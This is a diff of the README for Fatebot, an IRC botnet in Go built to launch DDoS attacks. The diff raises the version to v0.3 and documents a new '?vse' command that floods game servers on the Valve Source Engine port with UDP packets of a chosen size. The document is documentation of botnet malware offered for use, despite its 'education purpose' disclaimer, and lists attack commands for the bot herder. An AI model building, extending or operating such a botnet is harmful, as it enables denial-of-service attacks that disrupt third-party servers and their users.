@@ -1,6 +1,6 @@
 <h2>Attention Attention!!! My english is terrible. I'm so sorry about that :( </h2>
 
-# Fatebot v0.2.2
+# Fatebot v0.3
 This is my first IRC bot for launch ddos attack, Write on Go language. For education purpose only. Please test it in your lab. And i create this for join university in the future not for attack anyone server with out any permission!!!
 
 <strong>IRC commands are in the bottom of The page.</strong>
@@ -29,7 +29,9 @@ Main DDoS function is on <strong>The Application layer</strong>.
 # Update Lists
 <p><strong>Fatebot v0.1</strong> = Fatebot open release.</p>
 <p><strong>Fatebot v0.2</strong> = Update get bot system information function and Add tutorial in main and scan file.</p>
-<p><strong>Fatebot v0.2.1</strong> = Cut private scanning and OS signal by change it to delete when running. And change some IRC commands that will type easier.</p>
+<p><strong>Fatebot v0.2.1</strong> = Cut private scanning and OS signal by change it to delete when running. And change some IRC commands that will type easier.
+<p><strong>Fatebot v0.3</strong> = Update new DDoS Vector. Fix default UDP packet to 700 as default when bot herder not input The size.</p>
+</p>
 <p><strong>Fatebot v0.2.2</strong> = Cut scan failed report for fix server overheat and excess flood, 
   And Optimize by change ip range and default ping time, That will help to find SSH port faster.(Maybe, But faster than old one.)</p>
 
@@ -58,6 +60,16 @@ Main DDoS function is on <strong>The Application layer</strong>.
       <p>- Min and Max of Buffer is 1 - 700bytes.</p>
     </ul>
 </ul>
+
+<ul>
+  <li><strong>?vse [ip] [size]</li></strong>
+    <ul>
+      <li>?vse 192.168.1.16 500</li>
+      - Flood UDP packets by random src port with valve source engine dst port. To the target server that used to host online games.
+      <p>- Min and Max of Buffer is 1 - 700bytes.</p>
+    </ul>
+</ul>
+
 
 <ul>
   <li><strong>?icmp [ip]</li></strong>
